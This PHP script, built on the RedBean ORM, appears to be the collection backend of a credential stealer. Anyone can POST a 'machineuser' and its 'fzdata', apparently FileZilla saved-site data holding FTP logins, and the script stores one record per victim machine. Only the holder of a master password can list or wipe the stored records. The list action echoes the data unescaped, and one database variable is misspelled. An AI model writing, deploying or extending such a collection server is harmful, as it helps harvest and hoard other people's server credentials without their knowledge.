<?php
//error_reporting(0);
require ('redbean.php');
require ('config.php');
global $masterPassword;
global $mysqlHost;
global $mysqlDbName;
global $mysqlUserName;
global $mysqlPassword;
R::setup('mysql:host=' . $mysqlHost . ';dbname=' . $mysqlDbName, $mysqlUsername, $mysqlPassword);
if (isset($_POST['machineuser']) && isset($_POST['fzdata'])) {
    deleteByUser($_POST['machineuser']);
    $storedFzData = R::dispense('fzdata');
    $storedFzData->machineuser = $_POST['machineuser'];
    $storedFzData->data = $_POST['fzdata'];
    if (!empty(R::store($storedFzData))) {
        die('stored');
    }
}
if (isset($_POST['password']) && isset($_POST['action'])) {
    if ($_POST['password'] == $masterPassword) {
        if ($_POST['action'] == 'delall') {
            R::wipe('fzdata');
        }
        if ($_POST['action'] == 'list') {
            foreach (getFzData() as $fzData) {
                echo ('<machineuser>' . $fzData->machineuser . '</machineuser>' . '<data>' . $fzData->data . '</data><br>');
            }
            die();
        }
    } else {
        die();
    }
}
function deleteByUser($machineuser) {
    $storedFzData = R::findOne('fzdata', 'machineuser = ?', [$machineuser]);
    if (!empty($storedFzData)) {
        R::trash($storedFzData);
    }
}
function getFzData() {
    $commands = R::findAll('fzdata', 'data IS NOT null');
    return $commands;
}
?>